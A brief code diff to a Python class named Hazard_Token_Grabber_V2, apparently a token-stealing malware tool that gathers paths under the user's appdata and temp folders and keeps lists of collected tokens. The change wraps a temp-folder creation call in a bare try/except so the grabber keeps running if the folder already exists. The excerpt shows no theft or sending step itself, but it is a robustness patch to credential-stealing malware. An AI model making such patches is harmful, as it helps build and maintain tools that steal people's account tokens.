@@ -21,7 +21,10 @@ class Hazard_Token_Grabber_V2:
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
 
-        os.mkdir(os.path.join(self.tempfolder))
+        try:
+            os.mkdir(os.path.join(self.tempfolder))
+        except:
+            pass
 
         self.tokens = []
         self.saved = []
